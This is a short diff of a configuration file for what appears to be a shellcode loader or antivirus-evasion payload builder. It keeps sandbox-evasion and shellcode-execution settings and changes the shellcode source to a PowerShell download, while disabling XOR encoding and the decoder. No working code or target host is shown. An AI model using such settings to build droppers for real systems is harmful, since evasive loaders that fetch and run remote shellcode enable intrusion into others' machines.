@@ -31,13 +31,13 @@ add_evasion gethostbyname_sandbox_evasion
 #add_feature hide_console
 
 # set shellcode source
-shellcode_source static_from_file
+set_shellcode_source download_powershell
 
 # encode shellcode
-encode_shellcode xor 
+#encode_shellcode xor 
 
 # set decoder
-set_decoder xor
+set_decoder none
 
 # set shellcode binding technique
 shellcode_binding exec_shellcode
